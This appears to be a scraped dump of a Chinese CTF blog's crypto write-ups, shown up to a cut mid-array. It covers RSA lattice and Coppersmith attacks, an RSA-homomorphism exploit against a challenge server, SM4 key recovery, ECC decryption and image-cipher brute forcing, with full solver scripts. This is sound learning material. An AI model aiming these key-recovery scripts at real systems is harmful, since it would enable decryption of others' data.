exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import syssys.path.append(\"/home/k1rit0/CTF/\")import myCrypto.AMM as AMMfrom sage.all import *from Crypto.Util.number import inverse, isPrime, long_to_bytesLAM = 380l = 5M = [[0 for _ in range(l)] for _ in range(l)]N = [21068286322889605292449387381402285403911455560141090214735354974440606624419616964297007580321013791067226167439872996226832500580037706653803152998537359002847432836899418650117306549893607343160006144352760334920785866221130409904894118963374929467323935674617670738402419178327965359202178162667267351040190371168301980935481660326630257816016921697149710082155701629870160350348818834688225753303057415885022226024601907498521621901308603324694768684738802528845831936410741399435491742825201984427922436831471812070309418640813794622730842698875782093607446798284303784522710493344963880678737688403891400189331, 12308853561607841041934092506744511689155586116240481655471529969953855274038227343811431655989608434591583673694139060863738492861944511267544267389946989849658784130545243679913412818685768313761630659910263680193434985838781131523993553907838129189461461476296694554655782825701774629683350764866069156868009043211117580921049441277102377562595106269789041165210135844474567428536421792003953066707002965308982249630472773112238349557943156998108879517471317999283500584387777397105486037127797366322210846034599129011995028171723686883387966414035624689126402104807914499946793228044511016295452985310557970379011, 30738697791225132085580847654714047571186902668616746842899304102159584623469816318757206927486219023390491315148910896488732403322767246394501024688827804510369382155878820868892068583525039291929122306306627213766241320525799308714371006850194133645674073652842238370607838910482032953868627367283394607836966578300168303793400060582848922857236410576441317474208136497407564188049755626445760675555940268390636610085726624705570165069943427799504990418468772678900305743541682004982830947893963522764021022122922104982911181491725457610355492465006313490505471915305370861395875195908816803244772843442663436627811, 8305502698327938163061403448570905343510072391121488812862051390404395134941843998819543534972233651342461635174480345500578515464031763529097882752145582280163441217012244252516496790390759043249994221367357315376275069348967721415258505344163223181510037360702185803627278919587509933485368201596116686196256578251198487468448008040978019816660838136301253757474040665970837583661727365857243232757366302995923446406792674664094421560455977644181219681801233665490911903627509944363786700632306093740157219837713108792604909612708233475959478546962262259340699913418281265092058666045625836471989209312154073075491, 9249057556737779363640590847304104073427145700484200097209450631890326978899167760679154628208658960714377959140386507599020762987984595928908203986925752986701463694818100098371494812801057184146507393471109418242580315774651644212154315684690259768215107765517606521494940441845123991021958309973443907208341450704221754039776849253367952771456447007511355415631917532484344389697848200615413029231558971975377100287746424454815515972611696776506127916905426006223842544245270081659891304287086426791583147370534686626291189249685625856952980692492700851557019098598454447260906380261199261945010423393013023715209 ]for i in range(l): N[i] = int(sqrt(N[i]))for i in range(1,l): M[i][i] = -N[0] M[0][i] = N[i]M[0][0] = 2 ** LAML = Matrix(M).LLL()[0]assert L[0] % 2 ** LAM == 0q = abs(L[0] // 2 ** LAM)n = N[0]a = (n - (n % q)) // q# Know high bit of pn = 9249057556737779363640590847304104073427145700484200097209450631890326978899167760679154628208658960714377959140386507599020762987984595928908203986925752986701463694818100098371494812801057184146507393471109418242580315774651644212154315684690259768215107765517606521494940441845123991021958309973443907208341450704221754039776849253367952771456447007511355415631917532484344389697848200615413029231558971975377100287746424454815515972611696776506127916905426006223842544245270081659891304287086426791583147370534686626291189249685625856952980692492700851557019098598454447260906380261199261945010423393013023715209 e = 65537c = 596355871374007258796739088580480254690421307398563449520929804224579804032978250178898982384142847223103176953609592214108362545413436815340326688408982175941755069859344738153840235542651636279657627294019566968304679361239665444560606473133283058393087609946086549065553264454684624204753050326115020520403436076532095607286695957435489522985881581820635688415133423515447960953517405315231071959346343447601273197470177184887138457495799503680274625485150493280857586565387473867813858817367137470006514777542969192548145776362722942018998084778630461770023286812913356191141099060132770816764636107436181833654_p = a**2 R = PolynomialRing(Zmod(n),'x')x = R.gens()[0]f = _p + xroots = f.small_roots(X=2 ** 368,beta = 0.4)if roots: p = _p + int(roots[0]) print(p)assert n % p == 0q = n // pphi = (p-1) * (q-1)d = inverse_mod(e,phi)print(long_to_bytes(pow(c,d,n)))p = 117235409029105051846806067899523247170361728684595002856792997268214583527481018331523314373480172502868245719103537926811678162691190783273715963938227870577908696266175564889962816950193051688136250287087726752359306820791879258724210723175953346754995614733931375012961016374642411090783817788045807125779 e = 4096c = 9565562547953889050875342796317230683573917021053842636334550812905648260474828549598393988661413478381057558054348342995403993026447829846151651076469025927491897151314215230367392957203050021568190862146104714972731651005427897872753163387978990574633850084765886249824258759820964357075803586150088309646 R = PolynomialRing(Zmod(p),'x')R1 = [c]R2 = []for _ in range(12): for r in R1: x = R.gens()[0] f = x ^ 2 - r roots = f.roots() if roots: for root in roots: R2.append(root[0]) R1 = R2 R2 = [] print(R1)for m in R1: print(long_to_bytes(m)) ezl1nearproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121from Crypto.Util.number import long_to_bytes , bytes_to_long , getPrime , inversefrom Crypto.Cipher import AESimport socketserver , signalimport randomimport stringfrom hashlib import sha256import osflag = 'aaaaaaaaaaaaaaaa'q = 2**24def getrandbits(n): return bytes_to_long(os.urandom(n // 8+1)) &gt;&gt; (8-n%8)class server(socketserver.BaseRequestHandler): def _recv(self): data = self.request.recv(1024) return data.strip() def _send(self, msg, newline=True): if isinstance(msg , bytes): msg += b'\\n' else: msg += '\\n' msg = msg.encode() self.request.sendall(msg) def proof_of_work(self): random.seed(os.urandom(8)) proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self._send(f\"sha256(XXXX+{proof[4:]}) == {_hexdigest}\".encode()) self._send(b'Give me XXXX: ') x = self._recv() if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: self.send('wrong') return False return True def genrsa(self): _p = getPrime(1024) _q = getPrime(1024) self.n = _p * _q self.e = 65537 self.d = inverse(self.e , (_p-1)*(_q-1)) def to_vec(self,num , length): vec = [] while length &gt; 0: vec = [num % q] + vec num //= q length -= 1 return vec def to_mat(self,numlist): M =[] for i in numlist: M.append(self.to_vec(i , 40)) return M def enc(self, key , m): key = self.to_mat(key) res = [] for i in range(40): temp = 0 for j in range(16): temp += m[j]* key[j][i] temp %= q res.append(temp) return res def handle(self): # signal.alarm(120) # self.proof_of_work() self.genrsa() self._send(str(self.n)) self._send(str(self.e)) secret = [1] + [2*getrandbits(23)-1 for _ in range(15)] print(secret) self._send(b'Please generate key for me and I will give you my secret.But you have only two chances.') for i in range(2): key = [] f0 = getrandbits(480) print(f0) key.append(f0) self._send(str(pow(f0 , self.e , self.n))) f0 += f0 &lt;&lt; 480 for j in range(15): self._send('key'+str(i+1) + ':') c = int(self._recv()) m = pow(c , self.d , self.n) f = m - f0 f %= self.n key.append(f) c = self.enc(key , secret) self._send('Thanks, here is your cipher:' + str(c)) self._send(b'do you know the secret?') guess = [int(i) for i in self._recv().split(b' ')] if len(guess) == 16: for j in range(16): if guess[j] != secret[j]: break else: self._send(b'congratulations. here is your flag:') self._send(flag) return 0 else: self._send(b'L1near don\\'t care.') class ForkedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passif __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 10000 server = ForkedServer((HOST, PORT), server) server.allow_reuse_address = True server.serve_forever() 流程有点长, 大概就是随机生成一个向量, 我们的目标就是得到这个 一开始他会生成一个, 并通过RSA加密然后给我们密文 中间他会让我们输入15个, 但是这十五个不是直接咱们输入什么就是什么的, 他会经过一个RSA的解密 最后加上我们输入的15个一起生成一个的矩阵(一个key就生成一行) 然后计算密文这里密文我们是知道的, 我们只需要弄到就能得到了 而这里除了第一行, 都是我们自己构造的, 但是比较难控制,因为实际上的key和我们传过去差一个解密, 但是我们有一个的密文, 我们可以利用RSA的乘法同态就构造, 这个想是多少就是多少. 而且观察的生成, 我们发现只要得到第一行的所有数, 我们就能还原回, 因为的第一个固定是1, 而的第一行只有后面20个才有数字, 前面的20个都是0, 所以我们只要让后面的20列除了第一行都是0就可以得到了. 而且, 我们可以传, 让的后面几行的生成就是第一行的数字往前推i个, 所以我们让就能推到刚好只有第一行的后面列是有数字的. 那么大概的思路有了, 构造, 1. 必须得可逆, 才能求. 2. 后面20列是0$$(1,s_0,s_1,\\cdots,s_{13},s_{14})\\begin{pmatrix}0&amp;0&amp;\\cdots&amp;0&amp;a_0&amp;a_1&amp;\\cdots&amp;a_{19} \\k_{1,0}&amp;k_{1,1}&amp;\\cdots&amp;k_{1,19}&amp;0&amp;0&amp;\\cdots&amp;0 \\&amp;&amp;&amp;\\cdots \\k_{15,0}&amp;k_{15,1}&amp;\\cdots&amp;k_{15,19}&amp;0&amp;0&amp;\\cdots&amp;0 \\end{pmatrix}\\=(c_0,c_1,\\cdots,c_{19},a_0,a_1,\\cdots,a_{19})$$我们需要这个可逆, 就是要满秩, 就每次传的时候再加一个随机的系数就行了, 也就是传 构造出了上面这个, 就能利用还原, 再用生成整个, 最后求个算回即可 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from sage.all import *import reimport pwnimport randomq = 2**24def shiftf0(enc_f0,i): a = 2 ** 480 + 1 + (i+1) * q**20 return ((enc_f0 * pow(a,e,n)) % n)def to_vec(num , length): vec = [] while length &gt; 0: vec = [num % q] + vec num //= q length -= 1 return vecdef to_mat(numlist): M =[] for i in numlist: M.append(to_vec(i , 40)) return MCON = pwn.remote('172.27.176.1',10000)resp = CON.recvuntil('key1:\\n').decode().split('\\n')n = int(resp[0])e = 65537enc = int(resp[3])for _ in range(14): CON.sendline(str(shiftf0(enc,_)).encode()) resp = CON.recvuntil('key1:\\n').decode() print(_,resp)CON.sendline(str(shiftf0(enc,_+1)).encode())resp = CON.recvuntil('key2:\\n').decode().split('\\n')_res = resp[0][29:-1].split(',')res =[]for i in _res: res += [int(i)]f0 = 0for i in res[-20:]: f0 += i f0 = f0 &lt;&lt; 24f0 = f0 &gt;&gt; 24key = [f0]+ [((i+1)* q**20 * f0 ) % n for i in range(15)]M = matrix(Zmod(q),to_mat(key))print(M.solve_left(vector(res)))","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup for 2021 巅峰极客 Crypto","date":"2021-07-31T09:29:58.000Z","path":"2021/07/31/writeup-for-2021-巅峰极客/","text":"啊好久没更新blog了, 打了下巅峰极客, 写一下wp吧. MedicalImage一个图片加密脚本, 函数f(x)被隐藏了, 但给了提示, 是logistic map, (在b站看下视频, 数学真的好神奇啊).而且参数是最大合法值, 也就是, 那么函数f(x)为然后就是对着加密流程写解密了…. 没有啥特别的 逆着加密过程写解密就行, p0,c0就那几个值爆破就行, 一开始随便拿101,201试了下…直接对了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from decimal import *from PIL import Imageimport numpy as npfrom time import timegetcontext().prec = 20R = Decimal(4)r1 = Decimal('0.478706063089473894123')r2 = Decimal('0.613494245341234672318')r3 = Decimal('0.946365754637812381837')const = 10 ** 14im = Image.open( r'flag_enc.bmp')size = im.sizew,h = sizeim = np.array(im)def f(x): return Decimal(4 * x * (1 - x))for i in range(200): r1 = f(r1) r2 = f(r2) r3 = f(r3)S = time()p0 = 101c0 = 201for x in range(w): for y in range(h): k = int(round(const*r3))%256 k = bin(k)[2:].ljust(8,'0') k = int(k[p0%8:]+k[:p0%8],2) r3 = f(r3) m0 = ((k ^ im[y,x] ^ c0 ) - k) % 256 c0 = im[y,x] p0 = m0 im[y,x] = m0arr = []for x in range(w): for y in range(h): x1 = int(round(const*r1))%w y1 = int(round(const*r2))%h arr += [(x,y,x1,y1)] r1 = f(r1) r2 = f(r2)for z in arr[::-1]: x,y,x1,y1 = z tmp = im[y,x] im[y,x] = im[y1,x1] im[y1,x1] = tmp m = Image.new('P', size,'white')pixels = m.load()for i in range(m.size[0]): for j in range(m.size[1]): pixels[i,j] = (int(im[j][i]))m.save(r'flag.bmp')print(time()-S) LearnSM4果然是learnSM4, 看了题目马上跑去学SM4了, 看了一下加密过程, 不难 看题目, 要求利用给出的加密过程中的leak得到轮密钥的第一个,也就是key[0] 来看看第一轮加密的过程这个就是我们要求的, 是两个变换合在一起的, 自己手动试了一下, 发现变换时可以用z3梭出来的, 直接就能逆出来 而上面的等式中是自己构造的, 能利用题目给的leak得到, 传r=0,i=0~3即可 这里我直接传, 可以有 这几天写远程的脚本写吐了, 真不想写, 手打了这题, exp只有一步一步的 都是本地跑出结果手动输入上去的, 讲究着看吧(懒) 12345678910111213141516171819202122232425262728293031323334def getnum(arr): HEX = '' for i in arr: HEX += hex(i)[2:] return int(HEX,16)# 用z3逆T变换中的r(x)def f(B): B1 = (((B &lt;&lt; 2 ) &amp; 0b1100000000000000000000000000000000) &gt;&gt;32) ^ (B &lt;&lt; 2) &amp; 0xffffffff B2 = (((B &lt;&lt; 10) &amp; 0b111111111100000000000000000000000000000000) &gt;&gt; 32) ^ (B&lt;&lt;10) &amp; 0xffffffff B3 = (((B &lt;&lt; 18) &amp; 0b11111111111111111100000000000000000000000000000000) &gt;&gt; 32) ^ (B&lt;&lt;18) &amp; 0xffffffff B4 = (((B &lt;&lt; 24) &amp; 0b11111111111111111111111100000000000000000000000000000000) &gt;&gt; 32) ^ (B&lt;&lt;24) &amp; 0xffffffff return B ^ B1 ^ B2 ^ B3 ^ B4 S = z3.Solver()x = z3.BitVec('x',64)S.add((getnum([161,203,79,94])^1)- f(x)==0)if S.check(): print(S.model())# 逆S(x)def findS(value): for i in range(256): if S_BOX[i] == value: return i print(hex(2217051833)[2:]) # 2217051833 z3梭出的结果# 0x842586b9key = '0'arr = [0x84,0x25,0x86,0xb9]for i in arr: key += hex(findS(i))[2:]print(int(key,16)) 把最后得到的key值发过去就好了, 这里都没用到给的hint, 也不知道是不是非预期 crtrsa 有一种已知dp求p的方法 可以直接爆破dp然后求出p 这博客写的越来越懒了哈哈 有什么不清楚的qq找我吧 3519728596 这样也挺好 记录一下自己做过的就好了… 我是fw","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup-for-2021-CISCN","date":"2021-05-16T03:08:39.000Z","path":"2021/05/16/writeup-for-2021-CISCN/","text":"国赛初赛, 第一次参加国赛, 除了第一道恶心的古典, 其他题目还是做的挺有意思的一共六道题, 出了四道题, 剩下一道古典(呕了), 一道AES还可以吧, 记录一下, 虽然有些部分以前做过, 但还是学到了新东西的 0x00 classic 滚了, 等真密码👴👴的wp, 2021 / 5 /18 看了别的爷爷博客, 好家伙套娃爆破 ADFGX + 凯撒 +栅栏(话说是ADFGX这个顺序吗) 0x01 moveproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from Crypto.Util.number import *from math import sqrt, gcdimport randomBITS = 512f = open(\"flag.txt\", \"rb\")flag = f.read()f.close()def get_prime(nbit): while True: p = getPrime(nbit) if p % 3 == 2: return pdef gen(nbit): p = get_prime(nbit) q = get_prime(nbit) if q &gt; p: p, q = q, p n = p * q bound = int(sqrt(2 * n)) // 12 while True: x = random.randint(1, round(sqrt(bound))) y = random.randint(1, bound) // x zbound = int(((p - q) * round(n ** 0.25) * y) // (3 * (p + q))) z = zbound - ((p + 1) * (q + 1) * y + zbound) % x e = ((p + 1) * (q + 1) * y + z) // x if gcd(e, (p + 1) * (q + 1)) == 1: break gifts = [int(bin(p)[2:][:22], 2), int(bin(p)[2:][256:276], 2)] return n, e, giftsdef add(p1, p2): if p1 == (0, 0): return p2 if p2 == (0, 0): return p1 if p1[0] == p2[0] and (p1[1] != p2[1] or p1[1] == 0): return (0, 0) if p1[0] == p2[0]: tmp = (3 * p1[0] * p1[0]) * inverse(2 * p1[1], n) % n else: tmp = (p2[1] - p1[1]) * inverse(p2[0] - p1[0], n) % n x = (tmp * tmp - p1[0] - p2[0]) % n y = (tmp * (p1[0] - x) - p1[1]) % n return (int(x), int(y))def mul(n, p): r = (0, 0) tmp = p while 0 &lt; n: if n &amp; 1 == 1: r = add(r, tmp) n, tmp = n &gt;&gt; 1, add(tmp, tmp) return rn, e, hint = gen(BITS)pt = (bytes_to_long(flag[:len(flag) // 2]), bytes_to_long(flag[len(flag) // 2:]))c = mul(e, pt)f = open(\"output.txt\", \"w\")f.write(f\"n = {n}\\n\")f.write(f\"e = {e}\\n\")f.write(f\"h1 = {hint[0]}\\n\")f.write(f\"h2 = {hint[1]}\\n\")f.write(f\"c = {c}\\n\")f.close() analyses啊这，看到题目马上就想起刚结束不久的虎符的simultaneous了，当时那题没解出来恼火了好久。还好那个时候写wp写的够详细了，回去再看一遍又仿佛明白了一切hhh 传送门-&gt; 跟着虎符那样就能分解了，得到了，之后，再看看后面的加密 看到add() mul(), ECC没错了，吸取以前的教训，做ECC先看关系式是怎样的，从加法的那几行可以看出，这里用的椭圆曲线就是常用的那种，而且， 有一个点很容易就能算出参数 通过分解出的，我们就能造出曲线, 阶为，椭圆曲线的乘法就是一个环，乘完一个阶就转回来了，所以只需要求 就可以有 最后把点转回来就完事了 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677n = 80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281e = 67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809c = (6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605, 38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028)from Crypto.Util.number import long_to_bytesfrom gmpy2 import is_primedef find_p_puls_q(f,k): s = 0 b = k for i in range(2000): a = (s+b) // 2 if f.subs(x==a) &gt; 0: s = a else: b = a return adef find_p(pq,n): p = var('p') if pq^2 - 4*n&lt;0: return [] f = p^2 - pq*p+n r = f.roots() res = [] for i in r: if i[0]&gt;0: res.append(int(i[0])) return (res[0],res[1])def add(p1, p2): if p1 == (0, 0): return p2 if p2 == (0, 0): return p1 if p1[0] == p2[0] and (p1[1] != p2[1] or p1[1] == 0): return (0, 0) if p1[0] == p2[0]: tmp = (3 * p1[0] * p1[0]) * int(inverse_mod(2 * p1[1], n)) % n else: tmp = (p2[1] - p1[1]) * int(inverse_mod(p2[0] - p1[0], n) )% n x = (tmp * tmp - p1[0] - p2[0]) % n y = (tmp * (p1[0] - x) - p1[1]) % n return (int(x), int(y))def mul(n, p): r = (0, 0) tmp = p while 0 &lt; n: if n &amp; 1 == 1: r = add(r, tmp) n, tmp = n &gt;&gt; 1, add(tmp, tmp) return rsn = round(sqrt(n))L = [[sn,e],[0,-n]]L = matrix(L)R = L.LLL()[0]x = abs(R[0]) // sns = abs(R[1])A = round(n ^ 0.25)^2y = (e * x - s )//nkk = (e * x - y * n ) // yx = var('x')f =(3*(kk-1)*x-3*x^2)^2 - A*(x^2-4*n)ppq = find_p_puls_q(f,kk)p,q =find_p(ppq+1,n)b = - ( c[0] ** 3 - c[1]**2) % pE = EllipticCurve(GF(p), [0, 0, 0, 0, b])P = E(c)o = P.order()d = inverse_mod(e,o)m = d * E(c)print(long_to_bytes(m[0])+long_to_bytes(m[1])) 0x02 imageencryptproblem12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import randomfrom flag import flag,image,r,key1,key2import md5assert(flag[:5]=='CISCN')assert(len(str(r))==3)data = ''.join(map(chr,image))assert(flag[6:-1] == md5.new(data).hexdigest())assert(key1&lt;256)assert(key2&lt;256)x0 = random.random()x0 = round(x0,6)def generate(x): return round(r*x*(3-x),6)def encrypt(pixel,key1,key2,x0,m,n): num = m*n/8 seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&amp;0xff if ch == 1: pix = (~pix^key1)&amp;0xff if ch == 2: pix = (pix^key2)&amp;0xff if ch == 3: pix = (~pix^key2)&amp;0xff cipher[index] = pix return cipherflagimage = imagetestimage = []for i in range(16*16): testimage.append(random.randint(0,255))print testimageprint encrypt(testimage,key1,key2,x0,16,16)print encrypt(flagimage,key1,key2,x0,24,16) analyses这题做的时候没好好分析，有些结果没追究到底是为啥，拿到了就开始爆破了，现在好好分析一下。 这里模拟了一个图片的加密，加密会有一个范围在的六位小数初始值，以及一个咱们不知道的参数，但是这个参数有一个hint，len(str(r)) == 3，不过这个hint一开始误导我了。。。 先来看看具体的加密过程。加密大概可以分为两个过程 bitstream生成 根据bitstream key1 key2对图片进行加密 bitstream生成bitstream的生成跟两个变量有关，确定的这两个参数那么生成的bitstream将会一模一样，我们可以根据生成bitstream的函数写出这两个变量的一个关系也就是说我们只需要确定两个就能大概的算出了，先记为，后面有用 而bitstream是根据生成的序列来生成的，具体是这样这里的是拼接，而且在长度不够16的时候会在前面填充0到长度为16 加密我们把bitstream每两位看成一个，也就是说比特流是这样的-&gt;，显然的范围是 再说加密过程之前，得先了解一个小知识(~a ^ a )会把的所有位都置为1 好了，现在来看整个加密过程 这里的图片其实就是一个范围在的数的序列 一块公式直接搞定加密！(公式里的-m都是m的反码的意思)所以整个加密就是由bitstream来决定使用哪个密钥和操作 题目给了三个图片数据，要求 这里我们计算，如果是不取反的操作，那么异或出来的就是key， 如果是进行了取反操作的，那么异或出来的就是key的反码， 所以最后整个图片异或下来，出现的数据只会有四个数字 1[78, 177, 78, 177, 169, 78, 86, 86, 78, 177, 78, 169, 78, 78, 78, 177, 78, 177, 177, 169, 78, 86, 177, 169, 78, 177, 86, 78, 86, 169, 169, 169, 177, 169, 169, 169, 86, 169, 78, 78, 78, 78, 177, 177, 177, 78, 177, 78, 177, 169, 78, 86, 169, 78, 86, 177, 78, 86, 177, 177, 169, 78, 86, 169, 177, 86, 78, 177, 86, 169, 169, 177, 86, 177, 86, 78, 169, 169, 86, 86, 177, 78, 86, 78, 86, 78, 169, 169, 86, 86, 78, 169, 86, 169, 169, 86, 177, 86, 169, 169, 177, 177, 86, 86, 78, 169, 177, 78, 78, 169, 177, 169, 177, 78, 86, 86, 86, 78, 177, 78, 86, 86, 78, 78, 177, 78, 177, 169, 177, 86, 169, 177, 177, 78, 169, 78, 78, 169, 86, 177, 177, 78, 169, 78, 177, 78, 86, 177, 86, 86, 78, 86, 86, 86, 86, 86, 86, 177, 78, 177, 177, 169, 177, 86, 78, 177, 169, 177, 78, 86, 86, 86, 78, 78, 177, 86, 177, 78, 169, 78, 169, 169, 169, 86, 86, 78, 86, 169, 86, 78, 169, 169, 177, 86, 177, 169, 78, 78, 78, 78, 86, 177, 169, 78, 86, 177, 86, 78, 177, 78, 86, 86, 169, 86, 177, 78, 86, 86, 78, 177, 177, 169, 177, 86, 177, 86, 86, 169, 177, 169, 177, 78, 78, 169, 86, 86, 78, 177, 177, 169, 177, 78, 86, 177, 78, 177, 86, 169, 86, 86, 86, 169, 86, 177, 86, 177] [169,177,86,78]，而169对应的反码是86，177对应78 现在问题来了，有了这个能干嘛 能否通过这四个数字还原回bitstream呢，我们知道bitstream是决定使用哪个密钥的，而密钥的使用顺序我们是知道的(我们只是不知道哪个是key1 哪个是key2)，我们可以一一假设一下，也就8种组合 key1 key2 ~key1 ~key2 86 78 169 177 86 177 169 78 169 177 86 78 169 78 86 177 78 169 177 86 78 86 177 169 177 86 78 169 177 169 78 86 Xi 00 10 01 11 每种组合中，每个数字都对应一个，我们就能利用数字的顺序，还原出这种组合下所用的bitstream，也就是还原出这里用而不是就是因为还原出的不一定是对的，只有上面的8种情况中的1种才有可能对 因为上面的随便找了几个组合试了下算，发现都在中，再根据提示len(r) == 3，应该是个一位小数，比如这种（一开始我以为是3位数，几百的那种，让我懵了好久艹 现在，我们可以通过确定一种组合，来确定对应的和，但是加密用的bitstream比加密的长，所以想继续往下算bitstream，我们还需要 前面我们知道，是六位的小于1的小数，也就是说一共也就种可能，我们可以利用猜的和算出来的来生成bitstream，看得到的bitstream和我们算的bitstream是否相等来爆破，8种组合试完也就，十分钟不到就能解决。 爆破出，所有参数都可以对应的确定下来了。 剩下的就是重新算一次bitstream，直到长度够用来解密，解密就完事了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159# python2import randomimport md5from time import timem1 = [ 205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31]c1 = [ 131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174]c2 = [ 198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 